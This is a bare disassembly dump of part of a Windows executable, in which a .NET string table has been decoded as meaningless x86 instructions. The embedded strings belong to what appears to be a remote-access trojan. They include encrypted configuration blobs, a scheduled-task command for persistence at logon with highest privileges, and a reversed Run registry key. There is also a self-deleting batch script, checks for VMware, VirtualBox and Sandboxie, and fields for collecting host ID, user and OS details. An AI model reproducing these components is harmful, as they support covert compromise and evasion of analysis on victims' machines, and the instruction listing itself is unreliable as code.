  40be73:	00 4a 00             	add    %cl,0x0(%edx)
  40be76:	53                   	push   %ebx
  40be77:	00 4c 00 6b          	add    %cl,0x6b(%eax,%eax,1)
  40be7b:	00 4b 00             	add    %cl,0x0(%ebx)
  40be7e:	6e                   	outsb  %ds:(%esi),(%dx)
  40be7f:	00 72 00             	add    %dh,0x0(%edx)
  40be82:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40be86:	79 00                	jns    0x40be88
  40be88:	30 00                	xor    %al,(%eax)
  40be8a:	49                   	dec    %ecx
  40be8b:	00 79 00             	add    %bh,0x0(%ecx)
  40be8e:	44                   	inc    %esp
  40be8f:	00 71 00             	add    %dh,0x0(%ecx)
  40be92:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  40be96:	52                   	push   %edx
  40be97:	00 67 00             	add    %ah,0x0(%edi)
  40be9a:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40be9e:	51                   	push   %ecx
  40be9f:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40bea5:	80 b1 67 00 37 00 6f 	xorb   $0x6f,0x370067(%ecx)
  40beac:	00 55 00             	add    %dl,0x0(%ebp)
  40beaf:	78 00                	js     0x40beb1
  40beb1:	42                   	inc    %edx
  40beb2:	00 6f 00             	add    %ch,0x0(%edi)
  40beb5:	79 00                	jns    0x40beb7
  40beb7:	2f                   	das
  40beb8:	00 68 00             	add    %ch,0x0(%eax)
  40bebb:	4f                   	dec    %edi
  40bebc:	00 66 00             	add    %ah,0x0(%esi)
  40bebf:	43                   	inc    %ebx
  40bec0:	00 65 00             	add    %ah,0x0(%ebp)
  40bec3:	62 00                	bound  %eax,(%eax)
  40bec5:	51                   	push   %ecx
  40bec6:	00 51 00             	add    %dl,0x0(%ecx)
  40bec9:	4e                   	dec    %esi
  40beca:	00 51 00             	add    %dl,0x0(%ecx)
  40becd:	77 00                	ja     0x40becf
  40becf:	72 00                	jb     0x40bed1
  40bed1:	52                   	push   %edx
  40bed2:	00 67 00             	add    %ah,0x0(%edi)
  40bed5:	47                   	inc    %edi
  40bed6:	00 39                	add    %bh,(%ecx)
  40bed8:	00 4c 00 43          	add    %cl,0x43(%eax,%eax,1)
  40bedc:	00 4f 00             	add    %cl,0x0(%edi)
  40bedf:	44                   	inc    %esp
  40bee0:	00 4f 00             	add    %cl,0x0(%edi)
  40bee3:	47                   	inc    %edi
  40bee4:	00 62 00             	add    %ah,0x0(%edx)
  40bee7:	62 00                	bound  %eax,(%eax)
  40bee9:	43                   	inc    %ebx
  40beea:	00 6d 00             	add    %ch,0x0(%ebp)
  40beed:	4a                   	dec    %edx
  40beee:	00 46 00             	add    %al,0x0(%esi)
  40bef1:	61                   	popa
  40bef2:	00 61 00             	add    %ah,0x0(%ecx)
  40bef5:	49                   	dec    %ecx
  40bef6:	00 63 00             	add    %ah,0x0(%ebx)
  40bef9:	54                   	push   %esp
  40befa:	00 4a 00             	add    %cl,0x0(%edx)
  40befd:	4e                   	dec    %esi
  40befe:	00 47 00             	add    %al,0x0(%edi)
  40bf01:	33 00                	xor    (%eax),%eax
  40bf03:	42                   	inc    %edx
  40bf04:	00 4e 00             	add    %cl,0x0(%esi)
  40bf07:	72 00                	jb     0x40bf09
  40bf09:	50                   	push   %eax
  40bf0a:	00 30                	add    %dh,(%eax)
  40bf0c:	00 59 00             	add    %bl,0x0(%ecx)
  40bf0f:	58                   	pop    %eax
  40bf10:	00 6f 00             	add    %ch,0x0(%edi)
  40bf13:	6a 00                	push   $0x0
  40bf15:	33 00                	xor    (%eax),%eax
  40bf17:	78 00                	js     0x40bf19
  40bf19:	68 00 56 00 34       	push   $0x34005600
  40bf1e:	00 41 00             	add    %al,0x0(%ecx)
  40bf21:	34 00                	xor    $0x0,%al
  40bf23:	73 00                	jae    0x40bf25
  40bf25:	74 00                	je     0x40bf27
  40bf27:	47                   	inc    %edi
  40bf28:	00 46 00             	add    %al,0x0(%esi)
  40bf2b:	57                   	push   %edi
  40bf2c:	00 57 00             	add    %dl,0x0(%edi)
  40bf2f:	65 00 74 00 78       	add    %dh,%gs:0x78(%eax,%eax,1)
  40bf34:	00 61 00             	add    %ah,0x0(%ecx)
  40bf37:	45                   	inc    %ebp
  40bf38:	00 2b                	add    %ch,(%ebx)
  40bf3a:	00 4a 00             	add    %cl,0x0(%edx)
  40bf3d:	4e                   	dec    %esi
  40bf3e:	00 65 00             	add    %ah,0x0(%ebp)
  40bf41:	48                   	dec    %eax
  40bf42:	00 48 00             	add    %cl,0x0(%eax)
  40bf45:	49                   	dec    %ecx
  40bf46:	00 63 00             	add    %ah,0x0(%ebx)
  40bf49:	6d                   	insl   (%dx),%es:(%edi)
  40bf4a:	00 31                	add    %dh,(%ecx)
  40bf4c:	00 4b 00             	add    %cl,0x0(%ebx)
  40bf4f:	54                   	push   %esp
  40bf50:	00 41 00             	add    %al,0x0(%ecx)
  40bf53:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40bf58:	80 b1 41 00 78 00 48 	xorb   $0x48,0x780041(%ecx)
  40bf5f:	00 30                	add    %dh,(%eax)
  40bf61:	00 53 00             	add    %dl,0x0(%ebx)
  40bf64:	73 00                	jae    0x40bf66
  40bf66:	52                   	push   %edx
  40bf67:	00 73 00             	add    %dh,0x0(%ebx)
  40bf6a:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf6b:	00 58 00             	add    %bl,0x0(%eax)
  40bf6e:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
  40bf72:	44                   	inc    %esp
  40bf73:	00 6f 00             	add    %ch,0x0(%edi)
  40bf76:	6c                   	insb   (%dx),%es:(%edi)
  40bf77:	00 31                	add    %dh,(%ecx)
  40bf79:	00 73 00             	add    %dh,0x0(%ebx)
  40bf7c:	66 00 70 00          	data16 add %dh,0x0(%eax)
  40bf80:	63 00                	arpl   %eax,(%eax)
  40bf82:	30 00                	xor    %al,(%eax)
  40bf84:	53                   	push   %ebx
  40bf85:	00 61 00             	add    %ah,0x0(%ecx)
  40bf88:	34 00                	xor    $0x0,%al
  40bf8a:	76 00                	jbe    0x40bf8c
  40bf8c:	2f                   	das
  40bf8d:	00 6d 00             	add    %ch,0x0(%ebp)
  40bf90:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40bf94:	51                   	push   %ecx
  40bf95:	00 49 00             	add    %cl,0x0(%ecx)
  40bf98:	57                   	push   %edi
  40bf99:	00 66 00             	add    %ah,0x0(%esi)
  40bf9c:	4b                   	dec    %ebx
  40bf9d:	00 6e 00             	add    %ch,0x0(%esi)
  40bfa0:	75 00                	jne    0x40bfa2
  40bfa2:	76 00                	jbe    0x40bfa4
  40bfa4:	75 00                	jne    0x40bfa6
  40bfa6:	49                   	dec    %ecx
  40bfa7:	00 56 00             	add    %dl,0x0(%esi)
  40bfaa:	7a 00                	jp     0x40bfac
  40bfac:	7a 00                	jp     0x40bfae
  40bfae:	75 00                	jne    0x40bfb0
  40bfb0:	55                   	push   %ebp
  40bfb1:	00 52 00             	add    %dl,0x0(%edx)
  40bfb4:	5a                   	pop    %edx
  40bfb5:	00 71 00             	add    %dh,0x0(%ecx)
  40bfb8:	4f                   	dec    %edi
  40bfb9:	00 42 00             	add    %al,0x0(%edx)
  40bfbc:	76 00                	jbe    0x40bfbe
  40bfbe:	5a                   	pop    %edx
  40bfbf:	00 63 00             	add    %ah,0x0(%ebx)
  40bfc2:	75 00                	jne    0x40bfc4
  40bfc4:	53                   	push   %ebx
  40bfc5:	00 38                	add    %bh,(%eax)
  40bfc7:	00 32                	add    %dh,(%edx)
  40bfc9:	00 72 00             	add    %dh,0x0(%edx)
  40bfcc:	37                   	aaa
  40bfcd:	00 52 00             	add    %dl,0x0(%edx)
  40bfd0:	2f                   	das
  40bfd1:	00 75 00             	add    %dh,0x0(%ebp)
  40bfd4:	63 00                	arpl   %eax,(%eax)
  40bfd6:	4d                   	dec    %ebp
  40bfd7:	00 2b                	add    %ch,(%ebx)
  40bfd9:	00 51 00             	add    %dl,0x0(%ecx)
  40bfdc:	4e                   	dec    %esi
  40bfdd:	00 2b                	add    %ch,(%ebx)
  40bfdf:	00 55 00             	add    %dl,0x0(%ebp)
  40bfe2:	66 00 39             	data16 add %bh,(%ecx)
  40bfe5:	00 36                	add    %dh,(%esi)
  40bfe7:	00 68 00             	add    %ch,0x0(%eax)
  40bfea:	56                   	push   %esi
  40bfeb:	00 37                	add    %dh,(%edi)
  40bfed:	00 35 00 6d 00 6d    	add    %dh,0x6d006d00
  40bff3:	00 35 00 65 00 2f    	add    %dh,0x2f006500
  40bff9:	00 5a 00             	add    %bl,0x0(%edx)
  40bffc:	54                   	push   %esp
  40bffd:	00 2b                	add    %ch,(%ebx)
  40bfff:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40c003:	00 67 00             	add    %ah,0x0(%edi)
  40c006:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40c00b:	03 33                	add    (%ebx),%esi
  40c00d:	00 00                	add    %al,(%eax)
  40c00f:	80 b1 59 00 58 00 59 	xorb   $0x59,0x580059(%ecx)
  40c016:	00 45 00             	add    %al,0x0(%ebp)
  40c019:	57                   	push   %edi
  40c01a:	00 62 00             	add    %ah,0x0(%edx)
  40c01d:	37                   	aaa
  40c01e:	00 61 00             	add    %ah,0x0(%ecx)
  40c021:	41                   	inc    %ecx
  40c022:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  40c026:	00 78 00             	add    %bh,0x0(%eax)
  40c029:	62 00                	bound  %eax,(%eax)
  40c02b:	57                   	push   %edi
  40c02c:	00 50 00             	add    %dl,0x0(%eax)
  40c02f:	61                   	popa
  40c030:	00 36                	add    %dh,(%esi)
  40c032:	00 61 00             	add    %ah,0x0(%ecx)
  40c035:	35 00 79 00 4d       	xor    $0x4d007900,%eax
  40c03a:	00 30                	add    %dh,(%eax)
  40c03c:	00 77 00             	add    %dh,0x0(%edi)
  40c03f:	47                   	inc    %edi
  40c040:	00 47 00             	add    %al,0x0(%edi)
  40c043:	6c                   	insb   (%dx),%es:(%edi)
  40c044:	00 6d 00             	add    %ch,0x0(%ebp)
  40c047:	47                   	inc    %edi
  40c048:	00 68 00             	add    %ch,0x0(%eax)
  40c04b:	48                   	dec    %eax
  40c04c:	00 43 00             	add    %al,0x0(%ebx)
  40c04f:	76 00                	jbe    0x40c051
  40c051:	56                   	push   %esi
  40c052:	00 59 00             	add    %bl,0x0(%ecx)
  40c055:	33 00                	xor    (%eax),%eax
  40c057:	77 00                	ja     0x40c059
  40c059:	75 00                	jne    0x40c05b
  40c05b:	6a 00                	push   $0x0
  40c05d:	45                   	inc    %ebp
  40c05e:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40c062:	00 47 00             	add    %al,0x0(%edi)
  40c065:	6e                   	outsb  %ds:(%esi),(%dx)
  40c066:	00 46 00             	add    %al,0x0(%esi)
  40c069:	30 00                	xor    %al,(%eax)
  40c06b:	6d                   	insl   (%dx),%es:(%edi)
  40c06c:	00 77 00             	add    %dh,0x0(%edi)
  40c06f:	33 00                	xor    (%eax),%eax
  40c071:	61                   	popa
  40c072:	00 2b                	add    %ch,(%ebx)
  40c074:	00 79 00             	add    %bh,0x0(%ecx)
  40c077:	77 00                	ja     0x40c079
  40c079:	46                   	inc    %esi
  40c07a:	00 39                	add    %bh,(%ecx)
  40c07c:	00 52 00             	add    %dl,0x0(%edx)
  40c07f:	5a                   	pop    %edx
  40c080:	00 69 00             	add    %ch,0x0(%ecx)
  40c083:	75 00                	jne    0x40c085
  40c085:	68 00 51 00 51       	push   $0x51005100
  40c08a:	00 52 00             	add    %dl,0x0(%edx)
  40c08d:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40c091:	76 00                	jbe    0x40c093
  40c093:	76 00                	jbe    0x40c095
  40c095:	43                   	inc    %ebx
  40c096:	00 30                	add    %dh,(%eax)
  40c098:	00 31                	add    %dh,(%ecx)
  40c09a:	00 30                	add    %dh,(%eax)
  40c09c:	00 5a 00             	add    %bl,0x0(%edx)
  40c09f:	4f                   	dec    %edi
  40c0a0:	00 36                	add    %dh,(%esi)
  40c0a2:	00 56 00             	add    %dl,0x0(%esi)
  40c0a5:	61                   	popa
  40c0a6:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  40c0aa:	00 61 00             	add    %ah,0x0(%ecx)
  40c0ad:	70 00                	jo     0x40c0af
  40c0af:	55                   	push   %ebp
  40c0b0:	00 43 00             	add    %al,0x0(%ebx)
  40c0b3:	35 00 68 00 7a       	xor    $0x7a006800,%eax
  40c0b8:	00 68 00             	add    %ch,0x0(%eax)
  40c0bb:	77 00                	ja     0x40c0bd
  40c0bd:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40c0c2:	09 6e 00             	or     %ebp,0x0(%esi)
  40c0c5:	75 00                	jne    0x40c0c7
  40c0c7:	6c                   	insb   (%dx),%es:(%edi)
  40c0c8:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c0cc:	01 00                	add    %eax,(%eax)
  40c0ce:	03 3a                	add    (%edx),%edi
  40c0d0:	00 00                	add    %al,(%eax)
  40c0d2:	0d 50 00 61 00       	or     $0x610050,%eax
  40c0d7:	63 00                	arpl   %eax,(%eax)
  40c0d9:	6b 00 65             	imul   $0x65,(%eax),%eax
  40c0dc:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c0e0:	09 50 00             	or     %edx,0x0(%eax)
  40c0e3:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c0e9:	00 0f                	add    %cl,(%edi)
  40c0eb:	4d                   	dec    %ebp
  40c0ec:	00 65 00             	add    %ah,0x0(%ebp)
  40c0ef:	73 00                	jae    0x40c0f1
  40c0f1:	73 00                	jae    0x40c0f3
  40c0f3:	61                   	popa
  40c0f4:	00 67 00             	add    %ah,0x0(%edi)
  40c0f7:	65 00 00             	add    %al,%gs:(%eax)
  40c0fa:	07                   	pop    %es
  40c0fb:	63 00                	arpl   %eax,(%eax)
  40c0fd:	6d                   	insl   (%dx),%es:(%edi)
  40c0fe:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40c102:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40c108:	00 73 00             	add    %dh,0x0(%ebx)
  40c10b:	63 00                	arpl   %eax,(%eax)
  40c10d:	68 00 74 00 61       	push   $0x61007400
  40c112:	00 73 00             	add    %dh,0x0(%ebx)
  40c115:	6b 00 73             	imul   $0x73,(%eax),%eax
  40c118:	00 20                	add    %ah,(%eax)
  40c11a:	00 2f                	add    %ch,(%edi)
  40c11c:	00 63 00             	add    %ah,0x0(%ebx)
  40c11f:	72 00                	jb     0x40c121
  40c121:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40c125:	74 00                	je     0x40c127
  40c127:	65 00 20             	add    %ah,%gs:(%eax)
  40c12a:	00 2f                	add    %ch,(%edi)
  40c12c:	00 66 00             	add    %ah,0x0(%esi)
  40c12f:	20 00                	and    %al,(%eax)
  40c131:	2f                   	das
  40c132:	00 73 00             	add    %dh,0x0(%ebx)
  40c135:	63 00                	arpl   %eax,(%eax)
  40c137:	20 00                	and    %al,(%eax)
  40c139:	6f                   	outsl  %ds:(%esi),(%dx)
  40c13a:	00 6e 00             	add    %ch,0x0(%esi)
  40c13d:	6c                   	insb   (%dx),%es:(%edi)
  40c13e:	00 6f 00             	add    %ch,0x0(%edi)
  40c141:	67 00 6f 00          	add    %ch,0x0(%bx)
  40c145:	6e                   	outsb  %ds:(%esi),(%dx)
  40c146:	00 20                	add    %ah,(%eax)
  40c148:	00 2f                	add    %ch,(%edi)
  40c14a:	00 72 00             	add    %dh,0x0(%edx)
  40c14d:	6c                   	insb   (%dx),%es:(%edi)
  40c14e:	00 20                	add    %ah,(%eax)
  40c150:	00 68 00             	add    %ch,0x0(%eax)
  40c153:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40c159:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c15d:	74 00                	je     0x40c15f
  40c15f:	20 00                	and    %al,(%eax)
  40c161:	2f                   	das
  40c162:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40c166:	00 20                	add    %ah,(%eax)
  40c168:	00 22                	add    %ah,(%edx)
  40c16a:	00 00                	add    %al,(%eax)
  40c16c:	11 22                	adc    %esp,(%edx)
  40c16e:	00 20                	add    %ah,(%eax)
  40c170:	00 2f                	add    %ch,(%edi)
  40c172:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40c176:	00 20                	add    %ah,(%eax)
  40c178:	00 27                	add    %ah,(%edi)
  40c17a:	00 22                	add    %ah,(%edx)
  40c17c:	00 01                	add    %al,(%ecx)
  40c17e:	13 22                	adc    (%edx),%esp
  40c180:	00 27                	add    %ah,(%edi)
  40c182:	00 20                	add    %ah,(%eax)
  40c184:	00 26                	add    %ah,(%esi)
  40c186:	00 20                	add    %ah,(%eax)
  40c188:	00 65 00             	add    %ah,0x0(%ebp)
  40c18b:	78 00                	js     0x40c18d
  40c18d:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40c193:	5c                   	pop    %esp
  40c194:	00 6e 00             	add    %ch,0x0(%esi)
  40c197:	75 00                	jne    0x40c199
  40c199:	52                   	push   %edx
  40c19a:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40c19e:	00 6f 00             	add    %ch,0x0(%edi)
  40c1a1:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40c1a7:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40c1ab:	74 00                	je     0x40c1ad
  40c1ad:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1ae:	00 65 00             	add    %ah,0x0(%ebp)
  40c1b1:	72 00                	jb     0x40c1b3
  40c1b3:	72 00                	jb     0x40c1b5
  40c1b5:	75 00                	jne    0x40c1b7
  40c1b7:	43                   	inc    %ebx
  40c1b8:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40c1bc:	00 77 00             	add    %dh,0x0(%edi)
  40c1bf:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1c0:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40c1c4:	00 69 00             	add    %ch,0x0(%ecx)
  40c1c7:	57                   	push   %edi
  40c1c8:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40c1cc:	00 66 00             	add    %ah,0x0(%esi)
  40c1cf:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1d0:	00 73 00             	add    %dh,0x0(%ebx)
  40c1d3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1d4:	00 72 00             	add    %dh,0x0(%edx)
  40c1d7:	63 00                	arpl   %eax,(%eax)
  40c1d9:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40c1df:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c1e3:	61                   	popa
  40c1e4:	00 77 00             	add    %dh,0x0(%edi)
  40c1e7:	74 00                	je     0x40c1e9
  40c1e9:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c1ed:	53                   	push   %ebx
  40c1ee:	00 00                	add    %al,(%eax)
  40c1f0:	03 22                	add    (%edx),%esp
  40c1f2:	00 00                	add    %al,(%eax)
  40c1f4:	09 2e                	or     %ebp,(%esi)
  40c1f6:	00 62 00             	add    %ah,0x0(%edx)
  40c1f9:	61                   	popa
  40c1fa:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c1fe:	13 40 00             	adc    0x0(%eax),%eax
  40c201:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c205:	68 00 6f 00 20       	push   $0x20006f00
  40c20a:	00 6f 00             	add    %ch,0x0(%edi)
  40c20d:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40c211:	00 1f                	add    %bl,(%edi)
  40c213:	74 00                	je     0x40c215
  40c215:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40c21b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c21c:	00 75 00             	add    %dh,0x0(%ebp)
  40c21f:	74 00                	je     0x40c221
  40c221:	20 00                	and    %al,(%eax)
  40c223:	33 00                	xor    (%eax),%eax
  40c225:	20 00                	and    %al,(%eax)
  40c227:	3e 00 20             	add    %ah,%ds:(%eax)
  40c22a:	00 4e 00             	add    %cl,0x0(%esi)
  40c22d:	55                   	push   %ebp
  40c22e:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c232:	15 53 00 54 00       	adc    $0x540053,%eax
  40c237:	41                   	inc    %ecx
  40c238:	00 52 00             	add    %dl,0x0(%edx)
  40c23b:	54                   	push   %esp
  40c23c:	00 20                	add    %ah,(%eax)
  40c23e:	00 22                	add    %ah,(%edx)
  40c240:	00 22                	add    %ah,(%edx)
  40c242:	00 20                	add    %ah,(%eax)
  40c244:	00 22                	add    %ah,(%edx)
  40c246:	00 00                	add    %al,(%eax)
  40c248:	07                   	pop    %es
  40c249:	43                   	inc    %ebx
  40c24a:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40c24e:	00 00                	add    %al,(%eax)
  40c250:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40c254:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40c258:	00 22                	add    %ah,(%edx)
  40c25a:	00 00                	add    %al,(%eax)
  40c25c:	0f 22 00             	mov    %eax,%cr0
  40c25f:	20 00                	and    %al,(%eax)
  40c261:	2f                   	das
  40c262:	00 66 00             	add    %ah,0x0(%esi)
  40c265:	20 00                	and    %al,(%eax)
  40c267:	2f                   	das
  40c268:	00 71 00             	add    %dh,0x0(%ecx)
  40c26b:	00 05 78 00 70 00    	add    %al,0x700078
  40c271:	00 45 53             	add    %al,0x53(%ebp)
  40c274:	00 65 00             	add    %ah,0x0(%ebp)
  40c277:	6c                   	insb   (%dx),%es:(%edi)
  40c278:	00 65 00             	add    %ah,0x0(%ebp)
  40c27b:	63 00                	arpl   %eax,(%eax)
  40c27d:	74 00                	je     0x40c27f
  40c27f:	20 00                	and    %al,(%eax)
  40c281:	2a 00                	sub    (%eax),%al
  40c283:	20 00                	and    %al,(%eax)
  40c285:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c289:	6f                   	outsl  %ds:(%esi),(%dx)
  40c28a:	00 6d 00             	add    %ch,0x0(%ebp)
  40c28d:	20 00                	and    %al,(%eax)
  40c28f:	57                   	push   %edi
  40c290:	00 69 00             	add    %ch,0x0(%ecx)
  40c293:	6e                   	outsb  %ds:(%esi),(%dx)
  40c294:	00 33                	add    %dh,(%ebx)
  40c296:	00 32                	add    %dh,(%edx)
  40c298:	00 5f 00             	add    %bl,0x0(%edi)
  40c29b:	43                   	inc    %ebx
  40c29c:	00 6f 00             	add    %ch,0x0(%edi)
  40c29f:	6d                   	insl   (%dx),%es:(%edi)
  40c2a0:	00 70 00             	add    %dh,0x0(%eax)
  40c2a3:	75 00                	jne    0x40c2a5
  40c2a5:	74 00                	je     0x40c2a7
  40c2a7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c2ab:	53                   	push   %ebx
  40c2ac:	00 79 00             	add    %bh,0x0(%ecx)
  40c2af:	73 00                	jae    0x40c2b1
  40c2b1:	74 00                	je     0x40c2b3
  40c2b3:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c2b7:	00 19                	add    %bl,(%ecx)
  40c2b9:	4d                   	dec    %ebp
  40c2ba:	00 61 00             	add    %ah,0x0(%ecx)
  40c2bd:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2be:	00 75 00             	add    %dh,0x0(%ebp)
  40c2c1:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40c2c5:	63 00                	arpl   %eax,(%eax)
  40c2c7:	74 00                	je     0x40c2c9
  40c2c9:	75 00                	jne    0x40c2cb
  40c2cb:	72 00                	jb     0x40c2cd
  40c2cd:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c2d1:	00 2b                	add    %ch,(%ebx)
  40c2d3:	6d                   	insl   (%dx),%es:(%edi)
  40c2d4:	00 69 00             	add    %ch,0x0(%ecx)
  40c2d7:	63 00                	arpl   %eax,(%eax)
  40c2d9:	72 00                	jb     0x40c2db
  40c2db:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2dc:	00 73 00             	add    %dh,0x0(%ebx)
  40c2df:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2e0:	00 66 00             	add    %ah,0x0(%esi)
  40c2e3:	74 00                	je     0x40c2e5
  40c2e5:	20 00                	and    %al,(%eax)
  40c2e7:	63 00                	arpl   %eax,(%eax)
  40c2e9:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2ea:	00 72 00             	add    %dh,0x0(%edx)
  40c2ed:	70 00                	jo     0x40c2ef
  40c2ef:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2f0:	00 72 00             	add    %dh,0x0(%edx)
  40c2f3:	61                   	popa
  40c2f4:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c2f8:	00 6f 00             	add    %ch,0x0(%edi)
  40c2fb:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2fc:	00 00                	add    %al,(%eax)
  40c2fe:	0b 4d 00             	or     0x0(%ebp),%ecx
  40c301:	6f                   	outsl  %ds:(%esi),(%dx)
  40c302:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c306:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c30a:	0f 56 00             	orps   (%eax),%xmm0
  40c30d:	49                   	dec    %ecx
  40c30e:	00 52 00             	add    %dl,0x0(%edx)
  40c311:	54                   	push   %esp
  40c312:	00 55 00             	add    %dl,0x0(%ebp)
  40c315:	41                   	inc    %ecx
  40c316:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c31a:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40c31f:	77 00                	ja     0x40c321
  40c321:	61                   	popa
  40c322:	00 72 00             	add    %dh,0x0(%edx)
  40c325:	65 00 00             	add    %al,%gs:(%eax)
  40c328:	15 56 00 69 00       	adc    $0x690056,%eax
  40c32d:	72 00                	jb     0x40c32f
  40c32f:	74 00                	je     0x40c331
  40c331:	75 00                	jne    0x40c333
  40c333:	61                   	popa
  40c334:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40c338:	00 6f 00             	add    %ch,0x0(%edi)
  40c33b:	78 00                	js     0x40c33d
  40c33d:	00 17                	add    %dl,(%edi)
  40c33f:	53                   	push   %ebx
  40c340:	00 62 00             	add    %ah,0x0(%edx)
  40c343:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40c349:	6c                   	insb   (%dx),%es:(%edi)
  40c34a:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c34e:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40c352:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c356:	11 45 00             	adc    %eax,0x0(%ebp)
  40c359:	72 00                	jb     0x40c35b
  40c35b:	72 00                	jb     0x40c35d
  40c35d:	20 00                	and    %al,(%eax)
  40c35f:	48                   	dec    %eax
  40c360:	00 57 00             	add    %dl,0x0(%edi)
  40c363:	49                   	dec    %ecx
  40c364:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c368:	05 78 00 32 00       	add    $0x320078,%eax
  40c36d:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40c373:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40c379:	74 00                	je     0x40c37b
  40c37b:	49                   	dec    %ecx
  40c37c:	00 6e 00             	add    %ch,0x0(%esi)
  40c37f:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c383:	00 09                	add    %cl,(%ecx)
  40c385:	48                   	dec    %eax
  40c386:	00 57 00             	add    %dl,0x0(%edi)
  40c389:	49                   	dec    %ecx
  40c38a:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c38e:	09 55 00             	or     %edx,0x0(%ebp)
  40c391:	73 00                	jae    0x40c393
  40c393:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c397:	00 05 4f 00 53 00    	add    %al,0x53004f
  40c39d:	00 13                	add    %dl,(%ebx)
  40c39f:	4d                   	dec    %ebp
  40c3a0:	00 69 00             	add    %ch,0x0(%ecx)
  40c3a3:	63 00                	arpl   %eax,(%eax)
  40c3a5:	72 00                	jb     0x40c3a7
  40c3a7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3a8:	00 73 00             	add    %dh,0x0(%ebx)
  40c3ab:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3ac:	00 66 00             	add    %ah,0x0(%esi)
  40c3af:	74 00                	je     0x40c3b1
  40c3b1:	00 03                	add    %al,(%ebx)
  40c3b3:	20 00                	and    %al,(%eax)
  40c3b5:	00 09                	add    %cl,(%ecx)
  40c3b7:	54                   	push   %esp
  40c3b8:	00 72 00             	add    %dh,0x0(%edx)
  40c3bb:	75 00                	jne    0x40c3bd
  40c3bd:	65 00 00             	add    %al,%gs:(%eax)
  40c3c0:	0b 36                	or     (%esi),%esi
  40c3c2:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c3c5:	62 00                	bound  %eax,(%eax)
  40c3c7:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40c3cd:	46                   	inc    %esi
  40c3ce:	00 61 00             	add    %ah,0x0(%ecx)
  40c3d1:	6c                   	insb   (%dx),%es:(%edi)
  40c3d2:	00 73 00             	add    %dh,0x0(%ebx)
  40c3d5:	65 00 00             	add    %al,%gs:(%eax)
  40c3d8:	0b 33                	or     (%ebx),%esi
